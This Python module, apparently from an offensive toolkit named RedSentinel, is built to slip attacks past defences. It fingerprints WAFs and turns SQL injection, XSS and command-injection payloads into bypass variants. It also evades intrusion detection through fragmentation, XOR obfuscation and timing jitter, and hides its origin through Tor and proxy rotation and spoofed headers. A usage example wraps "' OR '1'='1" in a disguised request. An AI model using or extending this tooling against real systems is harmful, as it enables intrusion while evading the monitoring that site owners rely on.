"""
RedSentinel - Stealth & Evasion Module
Author: Alexandre Tavares - Redsentinel
Version: 7.0

Advanced evasion techniques:
- WAF bypass (context-aware)
- IDS evasion
- IP rotation (Tor/Proxy chains)
- User-Agent randomization
- Request timing randomization
- Protocol switching
- Header obfuscation
"""

import asyncio
import logging
import random
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import hashlib
import base64

logger = logging.getLogger(__name__)


@dataclass
class EvasionProfile:
    """Evasion profile configuration"""
    user_agent_rotation: bool = True
    request_delay: Tuple[float, float] = (1.0, 3.0)
    header_randomization: bool = True
    payload_encoding: str = 'none'  # none, url, double_url, unicode, hex
    protocol_version: str = 'HTTP/1.1'  # HTTP/1.0, HTTP/1.1, HTTP/2
    ip_rotation: bool = False
    tor_enabled: bool = False


class WAFBypass:
    """
    Advanced WAF bypass techniques
    """
    
    # Common WAFs signatures
    WAF_SIGNATURES = {
        'cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
        'akamai': ['akamai', 'AkamaiGHost'],
        'imperva': ['incap_ses', 'visid_incap'],
        'aws_waf': ['x-amzn-requestid', 'x-amzn-trace-id'],
        'modsecurity': ['mod_security', 'NOYB']
    }
    
    def __init__(self):
        self.detected_waf: Optional[str] = None
    
    def detect_waf(self, headers: Dict[str, str], body: str = '') -> Optional[str]:
        """
        Detect WAF from response headers and body
        
        Args:
            headers: Response headers
            body: Response body
        
        Returns:
            WAF name or None
        """
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower()
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if any(sig.lower() in v for v in headers_lower.values()):
                    self.detected_waf = waf_name
                    logger.info(f"Detected WAF: {waf_name}")
                    return waf_name
                
                if sig.lower() in body_lower:
                    self.detected_waf = waf_name
                    logger.info(f"Detected WAF: {waf_name}")
                    return waf_name
        
        return None
    
    def bypass_payload(
        self,
        payload: str,
        waf: Optional[str] = None,
        context: str = 'generic'
    ) -> List[str]:
        """
        Generate WAF bypass payloads
        
        Args:
            payload: Original payload
            waf: Detected WAF (or None for generic)
            context: Context (sql, xss, command, etc.)
        
        Returns:
            List of bypass payloads
        """
        waf = waf or self.detected_waf or 'generic'
        
        bypasses = []
        
        # Generic bypasses
        bypasses.extend(self._generic_bypasses(payload))
        
        # Context-specific bypasses
        if context == 'sql':
            bypasses.extend(self._sql_bypasses(payload))
        elif context == 'xss':
            bypasses.extend(self._xss_bypasses(payload))
        elif context == 'command':
            bypasses.extend(self._command_bypasses(payload))
        
        # WAF-specific bypasses
        if waf == 'cloudflare':
            bypasses.extend(self._cloudflare_bypasses(payload))
        elif waf == 'modsecurity':
            bypasses.extend(self._modsecurity_bypasses(payload))
        
        return list(set(bypasses))  # Deduplicate
    
    def _generic_bypasses(self, payload: str) -> List[str]:
        """Generic bypass techniques"""
        bypasses = []
        
        # URL encoding
        import urllib.parse
        bypasses.append(urllib.parse.quote(payload))
        bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
        
        # Case variation
        bypasses.append(payload.upper())
        bypasses.append(payload.lower())
        bypasses.append(''.join(c.upper() if i % 2 == 0 else c.lower() 
                               for i, c in enumerate(payload)))
        
        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        bypasses.append(unicode_encoded)
        
        # Hex encoding
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        bypasses.append(hex_encoded)
        
        # Base64
        b64_encoded = base64.b64encode(payload.encode()).decode()
        bypasses.append(b64_encoded)
        
        return bypasses
    
    def _sql_bypasses(self, payload: str) -> List[str]:
        """SQL injection bypasses"""
        bypasses = []
        
        # Comment injection
        bypasses.append(payload.replace(' ', '/**/'))
        bypasses.append(payload.replace(' ', '--+'))
        bypasses.append(payload.replace(' ', '#'))
        
        # Case manipulation
        bypasses.append(payload.replace('SELECT', 'SeLeCt'))
        bypasses.append(payload.replace('UNION', 'UnIoN'))
        
        # Inline comments
        bypasses.append(payload.replace('SELECT', 'SE/**/LECT'))
        bypasses.append(payload.replace('UNION', 'UN/**/ION'))
        
        # Alternative syntax
        if 'OR' in payload:
            bypasses.append(payload.replace('OR', '||'))
        if 'AND' in payload:
            bypasses.append(payload.replace('AND', '&&'))
        
        # Whitespace alternatives
        bypasses.append(payload.replace(' ', '%09'))  # Tab
        bypasses.append(payload.replace(' ', '%0a'))  # Newline
        bypasses.append(payload.replace(' ', '%0d'))  # Carriage return
        
        return bypasses
    
    def _xss_bypasses(self, payload: str) -> List[str]:
        """XSS bypasses"""
        bypasses = []
        
        # HTML entity encoding
        bypasses.append(''.join(f'&#{ord(c)};' for c in payload))
        bypasses.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # Mixed encoding
        mixed = ''
        for i, c in enumerate(payload):
            if i % 2 == 0:
                mixed += f'&#{ord(c)};'
            else:
                mixed += c
        bypasses.append(mixed)
        
        # Tag variation
        if '<script>' in payload:
            bypasses.append(payload.replace('<script>', '<SCRIPT>'))
            bypasses.append(payload.replace('<script>', '<scr<script>ipt>'))
            bypasses.append(payload.replace('<script>', '<script/x>'))
            bypasses.append(payload.replace('<script>', '<script\x00>'))
        
        # Event handler variation
        if 'onerror' in payload:
            bypasses.append(payload.replace('onerror', 'oNeRRoR'))
            bypasses.append(payload.replace('onerror', 'on%0aerror'))
        
        # Alternative vectors
        bypasses.append(payload.replace('<script>', '<svg onload='))
        bypasses.append(payload.replace('<script>', '<img src=x onerror='))
        
        return bypasses
    
    def _command_bypasses(self, payload: str) -> List[str]:
        """Command injection bypasses"""
        bypasses = []
        
        # Variable expansion
        bypasses.append(payload.replace('ls', 'l$@s'))
        bypasses.append(payload.replace('cat', 'c$()at'))
        
        # Glob patterns
        bypasses.append(payload.replace('cat', '/bin/c?t'))
        bypasses.append(payload.replace('ls', '/bin/l[s]'))
        
        # Encoding
        bypasses.append(payload.replace('cat', '$(printf cat)'))
        bypasses.append(payload.replace('ls', '`echo ls`'))
        
        # Separator alternatives
        for sep in ['|', '||', ';', '&', '&&', '\n']:
            if sep in payload:
                bypasses.append(payload.replace(sep, f'{sep}\t'))
                bypasses.append(payload.replace(sep, f'{sep} '))
        
        return bypasses
    
    def _cloudflare_bypasses(self, payload: str) -> List[str]:
        """Cloudflare-specific bypasses"""
        bypasses = []
        
        # Cloudflare often blocks on keywords
        # Use encoding and obfuscation
        
        # Fragment payloads
        if len(payload) > 10:
            mid = len(payload) // 2
            bypasses.append(payload[:mid] + '%00' + payload[mid:])
        
        # Use alternative HTTP methods
        # (This would be applied at request level, noted here)
        
        return bypasses
    
    def _modsecurity_bypasses(self, payload: str) -> List[str]:
        """ModSecurity-specific bypasses"""
        bypasses = []
        
        # ModSecurity has specific rule sets
        # Use null bytes and encoding
        
        bypasses.append(payload + '%00')
        bypasses.append(payload.replace('=', '%3d'))
        bypasses.append(payload.replace('<', '%3c'))
        bypasses.append(payload.replace('>', '%3e'))
        
        return bypasses


class IDSEvasion:
    """
    IDS evasion techniques
    """
    
    def __init__(self):
        self.evasion_techniques = [
            'fragmentation',
            'timing',
            'encoding',
            'protocol_manipulation'
        ]
    
    async def fragment_payload(
        self,
        payload: bytes,
        fragment_size: int = 8
    ) -> List[bytes]:
        """
        Fragment payload to evade IDS
        
        Args:
            payload: Original payload
            fragment_size: Size of each fragment
        
        Returns:
            List of fragments
        """
        fragments = []
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i+fragment_size]
            fragments.append(fragment)
        
        return fragments
    
    async def randomize_timing(
        self,
        min_delay: float = 0.5,
        max_delay: float = 2.0
    ):
        """Random delay between requests"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
    
    def obfuscate_traffic(
        self,
        data: bytes,
        method: str = 'xor'
    ) -> bytes:
        """
        Obfuscate traffic to evade IDS
        
        Args:
            data: Original data
            method: Obfuscation method (xor, base64, etc.)
        
        Returns:
            Obfuscated data
        """
        if method == 'xor':
            key = random.randint(1, 255)
            return bytes([b ^ key for b in data])
        
        elif method == 'base64':
            return base64.b64encode(data)
        
        elif method == 'reverse':
            return data[::-1]
        
        return data


class ProxyRotation:
    """
    IP rotation via proxies
    """
    
    def __init__(self, proxies: Optional[List[str]] = None, use_tor: bool = False):
        self.proxies = proxies or []
        self.use_tor = use_tor
        self.current_proxy_index = 0
        
        if use_tor:
            self.tor_proxy = 'socks5://127.0.0.1:9050'
            logger.info("Tor proxy enabled")
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy from rotation"""
        if self.use_tor:
            return self.tor_proxy
        
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        return proxy
    
    async def test_proxy(self, proxy: str) -> bool:
        """Test if proxy is working"""
        try:
            import aiohttp
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    'http://httpbin.org/ip',
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    return response.status == 200
        
        except Exception as e:
            logger.debug(f"Proxy {proxy} failed: {e}")
            return False


class UserAgentRotation:
    """
    User-Agent rotation
    """
    
    # Realistic user agents
    USER_AGENTS = [
        # Chrome Windows
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        
        # Firefox Windows
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        
        # Chrome Mac
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        
        # Firefox Mac
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        
        # Edge
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        
        # Safari Mac
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        
        # Mobile Chrome
        'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
        
        # Mobile Safari
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
    ]
    
    @classmethod
    def get_random(cls) -> str:
        """Get random user agent"""
        return random.choice(cls.USER_AGENTS)
    
    @classmethod
    def get_mobile(cls) -> str:
        """Get random mobile user agent"""
        mobile_agents = [ua for ua in cls.USER_AGENTS if 'Mobile' in ua or 'iPhone' in ua or 'Android' in ua]
        return random.choice(mobile_agents)
    
    @classmethod
    def get_desktop(cls) -> str:
        """Get random desktop user agent"""
        desktop_agents = [ua for ua in cls.USER_AGENTS if 'Mobile' not in ua and 'iPhone' not in ua and 'Android' not in ua]
        return random.choice(desktop_agents)


class StealthEngine:
    """
    Main stealth & evasion engine
    """
    
    def __init__(self, profile: EvasionProfile):
        self.profile = profile
        self.waf_bypass = WAFBypass()
        self.ids_evasion = IDSEvasion()
        self.proxy_rotation = ProxyRotation(use_tor=profile.tor_enabled)
        self.user_agent_rotation = UserAgentRotation()
    
    async def prepare_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, Any]] = None,
        payload: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Prepare stealthy request
        
        Args:
            method: HTTP method
            url: Target URL
            headers: Request headers
            data: Request data
            payload: Attack payload (if any)
        
        Returns:
            Prepared request configuration
        """
        headers = headers or {}
        
        # User-Agent rotation
        if self.profile.user_agent_rotation:
            headers['User-Agent'] = self.user_agent_rotation.get_random()
        
        # Header randomization
        if self.profile.header_randomization:
            headers.update(self._randomize_headers())
        
        # Proxy rotation
        proxy = None
        if self.profile.ip_rotation:
            proxy = self.proxy_rotation.get_next_proxy()
        
        # Request delay
        if self.profile.request_delay:
            min_delay, max_delay = self.profile.request_delay
            await asyncio.sleep(random.uniform(min_delay, max_delay))
        
        # Payload encoding
        if payload:
            payload = self._encode_payload(payload, self.profile.payload_encoding)
            if data:
                # Apply encoded payload to data
                for key in data:
                    if data[key] == '{PAYLOAD}':
                        data[key] = payload
        
        return {
            'method': method,
            'url': url,
            'headers': headers,
            'data': data,
            'proxy': proxy,
            'protocol': self.profile.protocol_version
        }
    
    def _randomize_headers(self) -> Dict[str, str]:
        """Generate randomized headers"""
        headers = {}
        
        # Random Accept-Language
        languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9']
        headers['Accept-Language'] = random.choice(languages)
        
        # Random Accept-Encoding
        encodings = ['gzip, deflate, br', 'gzip, deflate', 'gzip']
        headers['Accept-Encoding'] = random.choice(encodings)
        
        # Random Accept
        accepts = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            '*/*'
        ]
        headers['Accept'] = random.choice(accepts)
        
        # DNT (Do Not Track)
        if random.choice([True, False]):
            headers['DNT'] = '1'
        
        # Connection
        headers['Connection'] = random.choice(['keep-alive', 'close'])
        
        return headers
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload based on profile"""
        import urllib.parse
        
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'hex':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        
        return payload


# Usage example
if __name__ == "__main__":
    async def main():
        # Create stealth profile
        profile = EvasionProfile(
            user_agent_rotation=True,
            request_delay=(1.0, 3.0),
            header_randomization=True,
            payload_encoding='url',
            ip_rotation=False,
            tor_enabled=False
        )
        
        engine = StealthEngine(profile)
        
        # Prepare stealthy request
        request = await engine.prepare_request(
            method='GET',
            url='https://example.com/vulnerable',
            payload="' OR '1'='1"
        )
        
        print(f"Stealthy request prepared:")
        print(f"  User-Agent: {request['headers'].get('User-Agent')}")
        print(f"  Proxy: {request['proxy']}")
        print(f"  Headers: {request['headers']}")
        
        # WAF bypass
        waf = engine.waf_bypass
        payloads = waf.bypass_payload("' OR '1'='1", context='sql')
        print(f"\nGenerated {len(payloads)} WAF bypass payloads")
        print(f"  Examples: {payloads[:5]}")
    
    asyncio.run(main())

